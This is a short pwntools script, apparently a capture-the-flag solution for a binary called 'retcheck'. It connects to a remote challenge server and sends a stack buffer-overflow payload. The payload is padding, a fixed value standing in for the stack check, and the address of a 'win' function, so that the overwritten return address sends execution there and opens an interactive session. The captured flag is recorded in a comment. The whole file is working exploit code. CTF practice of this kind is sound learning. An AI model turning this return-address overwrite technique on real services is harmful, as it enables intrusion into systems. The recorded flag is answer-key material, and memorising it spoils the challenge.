from pwn import *

r = remote("challenge.ctf.games", 31463)

context.binary = elf = ELF("retcheck")

canary = 0x401465
win = elf.symbols.win
vuln = elf.symbols.vuln

padding = b'A' * 400 + b'B' *8

payload = padding + p64(canary) + b'C' * 8 + p64(win)

r.sendline(payload)

r.interactive()

# flag = flag{a73dc20c1cd1f918ae7b591e8625e349}
